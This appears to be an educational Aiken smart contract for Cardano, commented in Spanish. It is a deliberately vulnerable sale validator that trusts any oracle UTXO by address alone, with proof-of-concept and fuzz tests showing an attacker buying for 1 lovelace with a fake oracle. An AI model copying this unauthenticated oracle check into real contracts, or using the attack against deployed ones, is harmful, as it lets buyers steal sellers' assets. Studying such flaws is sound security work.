
// Un vendedor bloquea un UTXO que cualquiera puede comprar pagándole el
// precio publicado por un oráculo en `tx.reference_inputs`.

// El validator identifica el UTXO del oráculo sólo por su dirección (`from_script(oracle_hash)`),
// sin exigir un token de autenticación. Como en Cardano cualquiera puede crear un UTXO en cualquier
// dirección con el datum que quiera, un atacante planta un oráculo falso con `precio: 1` y compra
// pagando 1 lovelace.

use aiken/collection/list
use aiken/fuzz
use cardano/address.{VerificationKey, from_script, from_verification_key}
use cardano/assets
use cardano/transaction.{
  InlineDatum, Input, NoDatum, Output, OutputReference, Transaction, placeholder,
}

// ---------------------------------------------------------------------------
// Tipos
// ---------------------------------------------------------------------------

pub type Datum {
  /// quién recibe el pago al precio del oráculo (hash de clave pública)
  vendedor: ByteArray,
}

pub type OracleDatum {
  /// precio en lovelace publicado por el oráculo
  precio: Int,
}

// ---------------------------------------------------------------------------
// Lógica auxiliar
// ---------------------------------------------------------------------------

// confía en cualquier reference input que viva en la
// dirección del oráculo, sin verificar un token de autenticación.
fn leer_precio_oraculo(
  reference_inputs: List<Input>,
  oracle_hash: ByteArray,
) -> Option<Int> {
  let oracle_addr = from_script(oracle_hash)
  when
    list.find(reference_inputs, fn(i: Input) { i.output.address == oracle_addr })
  is {
    Some(ref_input) ->
      when ref_input.output.datum is {
        InlineDatum(raw) -> {
          expect oracle: OracleDatum = raw
          if oracle.precio > 0 {
            Some(oracle.precio)
          } else {
            None
          }
        }
        _ -> None
      }
    None -> None
  }
}

// Existe un output que paga al vendedor al menos `precio` lovelace.
fn pago_al_vendedor(
  outputs: List<Output>,
  vendedor: ByteArray,
  precio: Int,
) -> Bool {
  list.any(
    outputs,
    fn(output: Output) {
      output.address.payment_credential == VerificationKey(vendedor) && assets.lovelace_of(
        output.value,
      ) >= precio
    },
  )
}

fn puede_comprar(d: Datum, oracle_hash: ByteArray, tx: Transaction) -> Bool {
  when leer_precio_oraculo(tx.reference_inputs, oracle_hash) is {
    Some(precio) -> pago_al_vendedor(tx.outputs, d.vendedor, precio)
    None -> False
  }
}

// ---------------------------------------------------------------------------
// Validator
// ---------------------------------------------------------------------------

validator venta_vulnerable(oracle_hash: ByteArray) {
  spend(
    datum: Option<Datum>,
    _redeemer: Void,
    _utxo: OutputReference,
    self: Transaction,
  ) {
    expect Some(d) = datum
    puede_comprar(d, oracle_hash, self)
  }

  else(_) {
    fail
  }
}

// ---------------------------------------------------------------------------
// Helpers de test
// ---------------------------------------------------------------------------

const vendedor_hash: ByteArray = #"a1a1"

const oracle_script_hash: ByteArray = #"00a1c1e0"

const precio_real: Int = 100_000_000

const min_ada: Int = 2_000_000

const tx_id: ByteArray =
  #"0000000000000000000000000000000000000000000000000000000000000000"

fn make_oracle_ref_falso(precio: Int) -> Input {
  Input {
    output_reference: OutputReference { transaction_id: tx_id, output_index: 0 },
    output: Output {
      address: from_script(oracle_script_hash),
      value: assets.from_lovelace(min_ada),
      datum: InlineDatum(OracleDatum { precio }),
      reference_script: None,
    },
  }
}

fn tx_compra(ref_input: Input, pago: Int) -> Transaction {
  Transaction {
    ..placeholder,
    reference_inputs: [ref_input],
    outputs: [
      Output {
        address: from_verification_key(vendedor_hash),
        value: assets.from_lovelace(pago),
        datum: NoDatum,
        reference_script: None,
      },
    ],
  }
}

//  el precio real es 100 ADA, pero el atacante planta un UTXO
// falso en la misma dirección del oráculo con `precio: 1`
// y compra pagando 1 lovelace. Este test PASA demostrando el bug.
test poc_oraculo_falso_compra_a_1_lovelace() {
  let tx = tx_compra(make_oracle_ref_falso(1), 1)
  puede_comprar(Datum { vendedor: vendedor_hash }, oracle_script_hash, tx)
}

// el bug vale para cualquier precio falso menor al
// precio real.
fn precio_falso_fuzzer() -> Fuzzer<Int> {
  fuzz.int_between(1, precio_real - 1)
}

test prop_oraculo_falso_se_aprueba(precio_falso via precio_falso_fuzzer()) {
  let tx = tx_compra(make_oracle_ref_falso(precio_falso), precio_falso)
  puede_comprar(Datum { vendedor: vendedor_hash }, oracle_script_hash, tx)
}
